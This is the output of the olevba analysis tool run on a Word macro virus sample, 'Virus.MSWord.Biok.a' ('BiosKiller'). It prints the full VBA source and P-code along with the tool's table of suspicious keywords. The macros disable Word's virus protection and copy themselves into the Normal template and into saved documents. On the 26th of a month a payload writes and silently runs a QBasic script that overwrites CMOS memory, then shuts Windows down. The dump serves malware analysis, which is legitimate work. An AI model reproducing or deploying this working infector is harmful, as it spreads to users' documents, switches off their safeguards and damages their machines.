olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Biok.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO BiosKiller.cls 
in file: Virus.MSWord.Biok.a - OLE stream: 'Macros/VBA/BiosKiller'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAuEx
Call PayBiosKiller
ErrorAuEx:
End Sub
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorDOp
iMacroNormalCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroNormalCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "BiosKiller" Then
        BiosKillerInstalled = -1
    End If
Next i
If Not BiosKillerInstalled Then
    ActiveDocument.VBProject.VBComponents("BiosKiller").Export "C:\BK.sys"
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\BK.sys"
    ActiveDocument.VBProject.VBComponents("BiosKiller").Export "C:\APVBK.sys"
    NormalTemplate.VBProject.VBComponents.Import "C:\APVBK.sys"
    NormalTemplate.VBProject.VBComponents("BiosKiller").CodeModule.DeleteLines 1, 4
End If
ErrorDOp:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSAs
Dialogs(wdDialogFileSaveAs).Show
If ActiveDocument.SaveFormat = wdFormatTemplate Or ActiveDocument.SaveFormat = wdFormatDocument Then
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
End If
iMacroDocumentCount = ActiveDocument.VBProject.VBComponents.Count
For i = 1 To iMacroDocumentCount
If ActiveDocument.VBProject.VBComponents(i).Name = "BiosKiller" Then
    BiosKillerDocInstalled = -1
End If
Next i
If Not BiosKillerDocInstalled Then
NormalTemplate.VBProject.VBComponents("BiosKiller").Export "C:\BK.sys"
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\BK.sys"
NormalTemplate.VBProject.VBComponents("BiosKiller").Export "C:\APVBK.sys"
ActiveDocument.VBProject.VBComponents.Import "C:\APVBK.sys"
ActiveDocument.VBProject.VBComponents("BiosKiller").CodeModule.DeleteLines 1, 4
ActiveDocument.Save
End If
ErrorFSAs:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFiTe
MsgBox "Vous feriez mieux de vous acheter un AV...", vbCritical, "Virus BiosKiller"
ErrorFiTe:
End Sub
Sub HelpAbout()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorHeAb
CommandBars("Help").Controls(5).Caption = "A propos du Virus BiosKiller"
APVBK.Show
ErrorHeAb:
End Sub
Sub PayBiosKiller()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPBK
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
Tm$ = Mid(MyTime, 4, 5)
Ts$ = Mid(MyTime, 7, 8)
D1$ = Mid(MyDate, 1, 2)
If (Tm$ = "26") Or (Ts$ = "26") Then
    MsgBox "Vous connaissez le virus CIH ?" & Chr$(13) & "Je fais la même chose que lui...", vbCritical, "Virus BiosKiller"
End If
If D1$ = "26" Then
    MsgBox "Votre Bios va subir des changements..." & Chr$(13) & "HAHAHAHAHA", vbCritical, "Virus BiosKiller"
Open "C:\CMOS.bas" For Output As #1
    Print #1, "CLS"
    Print #1, "Screen 9"
    Print #1, "Color 4"
    Print #1, "DIM Byte AS STRING * 1"
    Print #1, "For CMOS = 1 To LOF(1)"
    Print #1, "OUT &H70, CMOS - 1"
    Print #1, "GET #1, , Byte"
    Print #1, "OUT &H71, ASC(Byte)"
    Print #1, "Next"
    Print #1, "Print ""Votre Bios a été flashé, HAHAHAHAHA!!!"""
    Print #1, "System"
Close #1
Shell "qbasic /run C:\CMOS.bas", vbHide
MsgBox "Votre bios a été flashé..." & Chr$(13) & "Je vais redémarrer votre ordinateur...", vbInformation, "Virus BiosKiller"
Tasks.ExitWindows
End If
ErrorPBK:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorToMa
MsgBox "Je suis un virus comme CIH...", vbCritical, "Virus BiosKiller"
ErrorToMa:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBCo
ErrorVVBCo:
End Sub
-------------------------------------------------------------------------------
VBA MACRO APVBK.frm 
in file: Virus.MSWord.Biok.a - OLE stream: 'Macros/VBA/APVBK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Unload APVBK
End Sub
Private Sub Userform_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Biok.a
' ===============================================================================
' Module streams:
' Macros/VBA/BiosKiller - 17842 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError ErrorAuEx 
' Line #6:
' 	ArgsCall (Call) PayBiosKiller 0x0000 
' Line #7:
' 	Label ErrorAuEx 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Private Sub Document_Open())
' Line #10:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #11:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #14:
' 	OnError ErrorDOp 
' Line #15:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroNormalCount 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroNormalCount 
' 	For 
' Line #17:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "BiosKiller"
' 	Eq 
' 	IfBlock 
' Line #18:
' 	LitDI2 0x0001 
' 	UMi 
' 	St BiosKillerInstalled 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	Ld BiosKillerInstalled 
' 	Not 
' 	IfBlock 
' Line #22:
' 	LitStr 0x0009 "C:\BK.sys"
' 	LitStr 0x000A "BiosKiller"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	LitStr 0x0009 "C:\BK.sys"
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #24:
' 	LitStr 0x000C "C:\APVBK.sys"
' 	LitStr 0x000A "BiosKiller"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #25:
' 	LitStr 0x000C "C:\APVBK.sys"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #26:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	LitStr 0x000A "BiosKiller"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Label ErrorDOp 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub FileSaveAs())
' Line #31:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #32:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #33:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #34:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #35:
' 	OnError ErrorFSAs 
' Line #36:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #37:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #38:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroDocumentCount 
' Line #41:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroDocumentCount 
' 	For 
' Line #42:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "BiosKiller"
' 	Eq 
' 	IfBlock 
' Line #43:
' 	LitDI2 0x0001 
' 	UMi 
' 	St BiosKillerDocInstalled 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	Ld BiosKillerDocInstalled 
' 	Not 
' 	IfBlock 
' Line #47:
' 	LitStr 0x0009 "C:\BK.sys"
' 	LitStr 0x000A "BiosKiller"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #48:
' 	LitStr 0x0009 "C:\BK.sys"
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #49:
' 	LitStr 0x000C "C:\APVBK.sys"
' 	LitStr 0x000A "BiosKiller"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #50:
' 	LitStr 0x000C "C:\APVBK.sys"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #51:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	LitStr 0x000A "BiosKiller"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #52:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	Label ErrorFSAs 
' Line #55:
' 	EndSub 
' Line #56:
' 	FuncDefn (Sub FileTemplates())
' Line #57:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #58:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #59:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #60:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #61:
' 	OnError ErrorFiTe 
' Line #62:
' 	LitStr 0x002A "Vous feriez mieux de vous acheter un AV..."
' 	Ld vbCritical 
' 	LitStr 0x0010 "Virus BiosKiller"
' 	ArgsCall MsgBox 0x0003 
' Line #63:
' 	Label ErrorFiTe 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub HelpAbout())
' Line #66:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #67:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #68:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #69:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #70:
' 	OnError ErrorHeAb 
' Line #71:
' 	LitStr 0x001C "A propos du Virus BiosKiller"
' 	LitDI2 0x0005 
' 	LitStr 0x0004 "Help"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #72:
' 	Ld APVBK 
' 	ArgsMemCall Show 0x0000 
' Line #73:
' 	Label ErrorHeAb 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub PayBiosKiller())
' Line #76:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #77:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #78:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #79:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #80:
' 	OnError ErrorPBK 
' Line #81:
' 	Dim 
' 	VarDefn MyDate
' 	VarDefn MyTime
' Line #82:
' 	Ld Date 
' 	St MyDate 
' Line #83:
' 	Ld Time 
' 	St MyTime 
' Line #84:
' 	Ld MyTime 
' 	LitDI2 0x0004 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St Tm$ 
' Line #85:
' 	Ld MyTime 
' 	LitDI2 0x0007 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	St Ts$ 
' Line #86:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St D1$ 
' Line #87:
' 	Ld Tm$ 
' 	LitStr 0x0002 "26"
' 	Eq 
' 	Paren 
' 	Ld Ts$ 
' 	LitStr 0x0002 "26"
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #88:
' 	LitStr 0x001E "Vous connaissez le virus CIH ?"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0020 "Je fais la même chose que lui..."
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x0010 "Virus BiosKiller"
' 	ArgsCall MsgBox 0x0003 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	Ld D1$ 
' 	LitStr 0x0002 "26"
' 	Eq 
' 	IfBlock 
' Line #91:
' 	LitStr 0x0026 "Votre Bios va subir des changements..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000A "HAHAHAHAHA"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x0010 "Virus BiosKiller"
' 	ArgsCall MsgBox 0x0003 
' Line #92:
' 	LitStr 0x000B "C:\CMOS.bas"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "CLS"
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "Screen 9"
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Color 4"
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "DIM Byte AS STRING * 1"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "For CMOS = 1 To LOF(1)"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "OUT &H70, CMOS - 1"
' 	PrintItemNL 
' Line #99:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "GET #1, , Byte"
' 	PrintItemNL 
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "OUT &H71, ASC(Byte)"
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "Print "Votre Bios a été flashé, HAHAHAHAHA!!!""
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "System"
' 	PrintItemNL 
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #105:
' 	LitStr 0x0017 "qbasic /run C:\CMOS.bas"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #106:
' 	LitStr 0x001A "Votre bios a été flashé..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0026 "Je vais redémarrer votre ordinateur..."
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x0010 "Virus BiosKiller"
' 	ArgsCall MsgBox 0x0003 
' Line #107:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	Label ErrorPBK 
' Line #110:
' 	EndSub 
' Line #111:
' 	FuncDefn (Sub ToolsMacro())
' Line #112:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #113:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #114:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #115:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #116:
' 	OnError ErrorToMa 
' Line #117:
' 	LitStr 0x001D "Je suis un virus comme CIH..."
' 	Ld vbCritical 
' 	LitStr 0x0010 "Virus BiosKiller"
' 	ArgsCall MsgBox 0x0003 
' Line #118:
' 	Label ErrorToMa 
' Line #119:
' 	EndSub 
' Line #120:
' 	FuncDefn (Sub ViewVBCode())
' Line #121:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #122:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #123:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #124:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #125:
' 	OnError ErrorVVBCo 
' Line #126:
' 	Label ErrorVVBCo 
' Line #127:
' 	EndSub 
' Macros/VBA/APVBK - 3140 bytes
' Line #0:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	Ld APVBK 
' 	ArgsCall Unlock 0x0001 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub Userform_Initialize())
' Line #8:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #9:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #12:
' 	EndSub 
' Line #13:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Biok.a' - OLE stream: 'Macros/APVBK/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ce virus a �t� cr�e par ZeMacroKiller98 du groupe [SOS]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Biok.a' - OLE stream: 'Macros/APVBK/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Biok.a' - OLE stream: 'Macros/APVBK/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�This virus was created by ZeMacroKiller98 of [SOS] group�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Biok.a' - OLE stream: 'Macros/APVBK/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Biok.a' - OLE stream: 'Macros/APVBK/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Copyright (c) 1998I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Biok.a' - OLE stream: 'Macros/APVBK/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Biok.a' - OLE stream: 'Macros/APVBK/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Biok.a' - OLE stream: 'Macros/APVBK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Biok.a' - OLE stream: 'Macros/APVBK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Biok.a' - OLE stream: 'Macros/APVBK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Biok.a' - OLE stream: 'Macros/APVBK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

